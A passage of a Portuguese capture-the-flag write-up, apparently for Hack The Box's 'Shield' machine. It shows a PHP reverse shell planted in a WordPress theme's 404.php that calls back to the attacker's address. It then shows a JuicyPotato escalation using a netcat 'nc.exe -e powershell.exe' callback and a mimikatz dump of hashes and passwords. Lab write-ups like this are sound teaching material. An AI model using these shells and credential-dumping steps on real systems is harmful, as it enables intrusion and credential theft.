            <span class="nv">$size</span> <span class="o">-=</span> <span class="nv">$bytes</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> <span class="c1">// script's dump</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">run</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">detect</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">daemonize</span><span class="p">())</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">settings</span><span class="p">();</span>

            <span class="c1">// ----- SOCKET BEGIN -----</span>
            <span class="nv">$socket</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">addr</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$socket</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">echo</span> <span class="s2">"SOC_ERROR: </span><span class="si">{</span><span class="nv">$errno</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="nv">$errstr</span><span class="si">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$socket</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span> <span class="c1">// set the socket stream to non-blocking mode | returns 'true' on Windows OS</span>

                <span class="c1">// ----- SHELL BEGIN -----</span>
                <span class="nv">$process</span> <span class="o">=</span> <span class="o">@</span><span class="nb">proc_open</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">shell</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$process</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">echo</span> <span class="s2">"PROC_ERROR: Cannot start the shell</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$pipes</span> <span class="k">as</span> <span class="nv">$pipe</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipe</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span> <span class="c1">// set the shell streams to non-blocking mode | returns 'false' on Windows OS</span>
                    <span class="p">}</span>

                    <span class="c1">// ----- WORK BEGIN -----</span>
                    <span class="nv">$status</span> <span class="o">=</span> <span class="nb">proc_get_status</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
                    <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$socket</span><span class="p">,</span> <span class="s2">"SOCKET: Shell has connected! PID: </span><span class="si">{</span><span class="nv">$status</span><span class="p">[</span><span class="s1">'pid'</span><span class="p">]</span><span class="si">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
                    <span class="k">do</span> <span class="p">{</span>
                        <span class="nv">$status</span> <span class="o">=</span> <span class="nb">proc_get_status</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$socket</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// check for end-of-file on SOCKET</span>
                            <span class="k">echo</span> <span class="s2">"SOC_ERROR: Shell connection has been terminated</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
                        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$status</span><span class="p">[</span><span class="s1">'running'</span><span class="p">])</span> <span class="p">{</span>                 <span class="c1">// check for end-of-file on STDOUT or if process is still running</span>
                            <span class="k">echo</span> <span class="s2">"PROC_ERROR: Shell process has been terminated</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>   <span class="k">break</span><span class="p">;</span> <span class="c1">// feof() does not work with blocking streams</span>
                        <span class="p">}</span>                                                                    <span class="c1">// use proc_get_status() instead</span>
                        <span class="nv">$streams</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
                            <span class="s1">'read'</span>   <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="nv">$socket</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]),</span> <span class="c1">// SOCKET | STDOUT | STDERR</span>
                            <span class="s1">'write'</span>  <span class="o">=&gt;</span> <span class="kc">null</span><span class="p">,</span>
                            <span class="s1">'except'</span> <span class="o">=&gt;</span> <span class="kc">null</span>
                        <span class="p">);</span>
                        <span class="nv">$num_changed_streams</span> <span class="o">=</span> <span class="o">@</span><span class="nb">stream_select</span><span class="p">(</span><span class="nv">$streams</span><span class="p">[</span><span class="s1">'read'</span><span class="p">],</span> <span class="nv">$streams</span><span class="p">[</span><span class="s1">'write'</span><span class="p">],</span> <span class="nv">$streams</span><span class="p">[</span><span class="s1">'except'</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// wait for stream changes | will not wait on Windows OS</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nv">$num_changed_streams</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
                            <span class="k">echo</span> <span class="s2">"STRM_ERROR: stream_select() failed</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
                        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$num_changed_streams</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">os</span> <span class="o">===</span> <span class="s1">'LINUX'</span><span class="p">)</span> <span class="p">{</span>
                                <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$socket</span>  <span class="p">,</span> <span class="nv">$streams</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">rw</span><span class="p">(</span><span class="nv">$socket</span>  <span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s1">'SOCKET'</span><span class="p">,</span> <span class="s1">'STDIN'</span> <span class="p">);</span> <span class="p">}</span> <span class="c1">// read from SOCKET and write to STDIN</span>
                                <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$streams</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">rw</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$socket</span>  <span class="p">,</span> <span class="s1">'STDERR'</span><span class="p">,</span> <span class="s1">'SOCKET'</span><span class="p">);</span> <span class="p">}</span> <span class="c1">// read from STDERR and write to SOCKET</span>
                                <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$streams</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">rw</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$socket</span>  <span class="p">,</span> <span class="s1">'STDOUT'</span><span class="p">,</span> <span class="s1">'SOCKET'</span><span class="p">);</span> <span class="p">}</span> <span class="c1">// read from STDOUT and write to SOCKET</span>
                            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">os</span> <span class="o">===</span> <span class="s1">'WINDOWS'</span><span class="p">)</span> <span class="p">{</span>
                                <span class="c1">// order is important</span>
                                <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$socket</span><span class="p">,</span> <span class="nv">$streams</span><span class="p">[</span><span class="s1">'read'</span><span class="p">])</span><span class="cm">/*------*/</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">rw</span> <span class="p">(</span><span class="nv">$socket</span>  <span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s1">'SOCKET'</span><span class="p">,</span> <span class="s1">'STDIN'</span> <span class="p">);</span> <span class="p">}</span> <span class="c1">// read from SOCKET and write to STDIN</span>
                                <span class="k">if</span> <span class="p">((</span><span class="nv">$fstat</span> <span class="o">=</span> <span class="nb">fstat</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span> <span class="o">&amp;&amp;</span> <span class="nv">$fstat</span><span class="p">[</span><span class="s1">'size'</span><span class="p">])</span> <span class="p">{</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">brw</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$socket</span>  <span class="p">,</span> <span class="s1">'STDERR'</span><span class="p">,</span> <span class="s1">'SOCKET'</span><span class="p">);</span> <span class="p">}</span> <span class="c1">// read from STDERR and write to SOCKET</span>
                                <span class="k">if</span> <span class="p">((</span><span class="nv">$fstat</span> <span class="o">=</span> <span class="nb">fstat</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="o">&amp;&amp;</span> <span class="nv">$fstat</span><span class="p">[</span><span class="s1">'size'</span><span class="p">])</span> <span class="p">{</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">brw</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$socket</span>  <span class="p">,</span> <span class="s1">'STDOUT'</span><span class="p">,</span> <span class="s1">'SOCKET'</span><span class="p">);</span> <span class="p">}</span> <span class="c1">// read from STDOUT and write to SOCKET</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">error</span><span class="p">);</span>
                    <span class="c1">// ------ WORK END ------</span>

                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$pipes</span> <span class="k">as</span> <span class="nv">$pipe</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipe</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="c1">// ------ SHELL END ------</span>

                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$socket</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// ------ SOCKET END ------</span>

        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="s1">'&lt;pre&gt;'</span><span class="p">;</span>
<span class="c1">// change the host address and/or port number as necessary</span>
<span class="nv">$sh</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Shell</span><span class="p">(</span><span class="s1">'10.10.15.185'</span><span class="p">,</span> <span class="mi">8443</span><span class="p">);</span>
<span class="nv">$sh</span><span class="o">-&gt;</span><span class="nf">run</span><span class="p">();</span>
<span class="k">unset</span><span class="p">(</span><span class="nv">$sh</span><span class="p">);</span>
<span class="c1">// garbage collector requires PHP v5.3.0 or greater</span>
<span class="c1">// @gc_collect_cycles();</span>
<span class="k">echo</span> <span class="s1">'&lt;/pre&gt;'</span><span class="p">;</span>

</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/htb/htb-shield-6.png" /></p><p>Ao clicar em <code class="language-plaintext highlighter-rouge">Update File</code>, nós salvamos a alteração. Precisamos setar um <code class="language-plaintext highlighter-rouge">netcat</code>, na porta escolhida, no meu caso 8443 e em seguida fazer um curl para o endereço da página <code class="language-plaintext highlighter-rouge">404.php</code>.</p><p>Por padrão, o Wordpress salva seus recursos de tema em <code class="language-plaintext highlighter-rouge">wp-content/&lt;nome do tema&gt;/404.php</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Shield]
└─<span class="nv">$ </span>curl 10.10.10.29/wordpress/wp-content/themes/gutenbooster/404.php
</pre></table></code></div></div><p>E conseguimos o shell.</p><p><img data-proofer-ignore data-src="/img/htb/htb-shield-7.png" /></p><p>Esta máquina também não possui a flag de usuário, portanto, precisamos efetuar a escalação de privilégios.</p><h2 id="escalação-de-privilégios">Escalação de privilégios</h2><p>Ao efetuar a enumeração local, descobrimos que estamos logados com o usuário <code class="language-plaintext highlighter-rouge">iis apppool\wordpress</code> e o sistema tem a arquitetura <code class="language-plaintext highlighter-rouge">x64</code>.</p><pre><code class="language-cmd">C:\inetpub\wwwroot\wordpress\wp-content\themes\gutenbooster&gt;whoami
iis apppool\wordpress

C:\inetpub\wwwroot\wordpress\wp-content\themes\gutenbooster&gt;systeminfo

Host Name:                 SHIELD
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00376-30000-00299-AA303
Original Install Date:     2/4/2020, 12:58:01 PM
System Boot Time:          9/6/2021, 8:35:40 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 976 MB
Virtual Memory: Max Size:  2,431 MB
Virtual Memory: Available: 1,253 MB
Virtual Memory: In Use:    1,178 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    MEGACORP.LOCAL
Logon Server:              N/A
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB4520724
                           [03]: KB4524244
                           [04]: KB4537764
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.29
                                 [02]: fe80::6c58:513d:ce98:635d
                                 [03]: dead:beef::6c58:513d:ce98:635d
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

C:\inetpub\wwwroot\wordpress\wp-content\themes\gutenbooster
</code></pre><p>O Windows Server 2016, assim como algumas outras versões, se não tiver o patch de correção, pode ser vulnerável às vulnerabilidades <code class="language-plaintext highlighter-rouge">Potatoes</code>, no caso da versão 2016, é o <code class="language-plaintext highlighter-rouge">Juice Potato</code>.</p><p>Esta vunerabilidade permite a escalção de privilégios. Mais informações sobre as vulnerabilidades <a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html">aqui</a>.</p><p>Após baixar o binário do repositório citado acima, precisamos fazer upload para o servidor, para isso vamos iniciar um server HTTP com python3 e utilizar o comando <code class="language-plaintext highlighter-rouge">certutil do windows</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Shield]
└─<span class="nv">$ </span><span class="nb">mv </span>JuicyPotato.exe jp.exe
                                                                                                                     
┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Shield]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</pre></table></code></div></div><p>Porém, só conseguimos fazer upload em um diretório em que o usuário tenha permissão de escrita, normalmente o usuário do webserver tem permissões de escrita no diretório <code class="language-plaintext highlighter-rouge">/wp-content/uploads</code>, vamos navegar até lá.</p><p><img data-proofer-ignore data-src="/img/htb/htb-shield-8.png" /></p><p>Agora podemos requisitar para nosso HTTP server.</p><p><img data-proofer-ignore data-src="/img/htb/htb-shield-9.png" /></p><p>Com o exploit no alvo, precisamos de uma forma de executá-lo e obter acesso administrativo.</p><p>Mas antes, precisamos entender como o exploit funciona.</p><p>Basiamente ele executa um programa ou executável com privilégios administrativos, podemos executar qualquer programa já existente no Windows, ou criar nosso próprio script <code class="language-plaintext highlighter-rouge">.bat</code> e obter uma conexão reversa.</p><p>Poém, para obter a conexão reversa, precisamos de algum executável que possa fazer esta função. A própria distribuição Kali Linux, tem alguns executáveis Windows que podemos aproveitar, inclusive o <code class="language-plaintext highlighter-rouge">netcat</code>.</p><p>No diretório <code class="language-plaintext highlighter-rouge">/usr/share/windows-binaries/</code> encontramos o <code class="language-plaintext highlighter-rouge">nc.exe</code>, que podemos copiar para o nosso diretório atual e subir para nosso alvo da mesma forma que subimos o exploit.</p><p><img data-proofer-ignore data-src="/img/htb/htb-shield-10.png" /></p><p>Com o netcat na máquina alvo, podemos usar o próprio <code class="language-plaintext highlighter-rouge">echo</code> do Windows para criarmos um script <code class="language-plaintext highlighter-rouge">reverse.bat</code> com o comando para nos enviar um Power Shell com o netcat.</p><pre><code class="language-cmd">C:\inetpub\wwwroot\wordpress\wp-content\uploads&gt;echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.15.185 8444 &gt; reverse.bat  
</code></pre><p><img data-proofer-ignore data-src="/img/htb/htb-shield-11.png" /></p><p>Com tuddo pronto, podemos setar um netcat para ouvir na porta 8444, que foi a utilizada em nosso script e enviar o comando para o exploit.</p><pre><code class="language-cmd">C:\inetpub\wwwroot\wordpress\wp-content\uploads&gt;jp.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\reverse.bat -l 1337
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
</code></pre><p>O exploit executou nosso script e nos deu um reverse shell com privilégios administrativos!!!</p><p><img data-proofer-ignore data-src="/img/htb/htb-shield-12.png" /></p><p>A flag <code class="language-plaintext highlighter-rouge">root.txt</code> se encontra no Desktop do Administrator.</p><h2 id="pós-exploração">Pós exploração</h2><p>Ainda podemos checar a possibilidade de obter senhas de outros usuários do Windows Server, e como sabemos que no <code class="language-plaintext highlighter-rouge">Starting Point</code> senhas são valiosas, não custa tentar.</p><p>Na própria distribuição Kali Linux, no diretório <code class="language-plaintext highlighter-rouge">/usr/share/windows-resources/</code>, encontramos mais executáveis, entre eles o <code class="language-plaintext highlighter-rouge">mimikatz.exe</code>, podemos copiar a versão de 64 bits para nosso diretório atual e subir para o alvo da mesma forma que fizemos antes.</p><p><img data-proofer-ignore data-src="/img/htb/htb-shield-13.png" /></p><p>Agora em nosso shell administrativo, podemos executá-lo.</p><p><img data-proofer-ignore data-src="/img/htb/htb-shield-14.png" /></p><p>Com o comando <code class="language-plaintext highlighter-rouge">sekurlsa::logonpasswords</code>, obtemos o dump de todos as senhas em cache.</p><pre><code class="language-cmd">
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 66298 (00000000:000102fa)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/7/2021 5:14:07 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : SHIELD$
         * Domain   : MEGACORP
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :
        wdigest :
         * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)
        kerberos :
         * Username : SHIELD$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8&lt;Kx'\*9e&lt;s`ZV uNjoe Q%\_mX&lt;Eo%lB:NM6@-a+qJt_l887Ew&amp;m_ewr??#VE&amp;
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SHIELD$
Domain            : MEGACORP
Logon Server      : (null)
Logon Time        : 9/7/2021 5:14:07 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : SHIELD$
         * Domain   : MEGACORP
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :
        wdigest :
         * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)
        kerberos :
         * Username : shield$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8&lt;Kx'\*9e&lt;s`ZV uNjoe Q%\_mX&lt;Eo%lB:NM6@-a+qJt_l887Ew&amp;m_ewr??#VE&amp;
        ssp :
        credman :

Authentication Id : 0 ; 36467 (00000000:00008e73)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 9/7/2021 5:14:07 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : SHIELD$
         * Domain   : MEGACORP
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 308037 (00000000:0004b345)
Session           : Interactive from 1
User Name         : sandra
Domain            : MEGACORP
Logon Server      : PATHFINDER
Logon Time        : 9/7/2021 5:15:25 PM
SID               : S-1-5-21-1035856440-4137329016-3276773158-1105
        msv :
         [00000003] Primary
         * Username : sandra
         * Domain   : MEGACORP
         * NTLM     : 29ab86c5c4d2aab957763e5c1720486d
         * SHA1     : 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38
         * DPAPI    : f4c73b3f07c4f309ebf086644254bcbc
        tspkg :
        wdigest :
         * Username : sandra
         * Domain   : MEGACORP
         * Password : (null)
        kerberos :
         * Username : sandra
         * Domain   : MEGACORP.LOCAL
         * Password : Password1234!
        ssp :
        credman :

Authentication Id : 0 ; 167946 (00000000:0002900a)
Session           : Service from 0
User Name         : wordpress
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 9/7/2021 5:14:32 PM
SID               : S-1-5-82-698136220-2753279940-1413493927-70316276-1736946139
        msv :
         [00000003] Primary
         * Username : SHIELD$
         * Domain   : MEGACORP
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :
        wdigest :
         * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)
        kerberos :
         * Username : SHIELD$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8&lt;Kx'\*9e&lt;s`ZV uNjoe Q%\_mX&lt;Eo%lB:NM6@-a+qJt_l887Ew&amp;m_ewr??#VE&amp;
        ssp :
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 9/7/2021 5:14:11 PM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 9/7/2021 5:14:08 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 66277 (00000000:000102e5)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/7/2021 5:14:07 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : SHIELD$
         * Domain   : MEGACORP
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :
        wdigest :
         * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)
        kerberos :
         * Username : SHIELD$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8&lt;Kx'\*9e&lt;s`ZV uNjoe Q%\_mX&lt;Eo%lB:NM6@-a+qJt_l887Ew&amp;m_ewr??#VE&amp;
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SHIELD$
Domain            : MEGACORP
Logon Server      : (null)
Logon Time        : 9/7/2021 5:14:07 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)
        kerberos :
         * Username : shield$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8&lt;Kx'\*9e&lt;s`ZV uNjoe Q%\_mX&lt;Eo%lB:NM6@-a+qJt_l887Ew&amp;m_ewr??#VE&amp;
        ssp :
        credman :

mimikatz # 
</code></pre><p>E entre os dados do dump, conseguimos as seguintes credenciais:</p><pre><code class="language-cmd">        kerberos :
         * Username : sandra
         * Domain   : MEGACORP.LOCAL
         * Password : Password1234!
</code></pre><p><br /></p><p>E comprometemos o server!! <br /></p><p><img data-proofer-ignore data-src="/img/htb/hackerman.gif" /> <br /></p><h3 id="referências">Referências</h3><div class="table-wrapper"><table><thead><tr><th>Vulnerabilidade<th>Url<tbody><tr><td>Juicy Potato<td><a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#juicyPotato">https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#juicyPotato</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeups/'>Writeups</a>, <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/starting-point/" class="post-tag no-text-decoration" >Starting point</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/very-easy/" class="post-tag no-text-decoration" >Very Easy</a> <a href="/tags/web/" class="post-tag no-text-decoration" >Web</a> <a href="/tags/wordpress/" class="post-tag no-text-decoration" >WordPress</a> <a href="/tags/juice-potato/" class="post-tag no-text-decoration" >Juice Potato</a> <a href="/tags/mimikatz/" class="post-tag no-text-decoration" >Mimikatz</a> <a href="/tags/php/" class="post-tag no-text-decoration" >PHP</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a 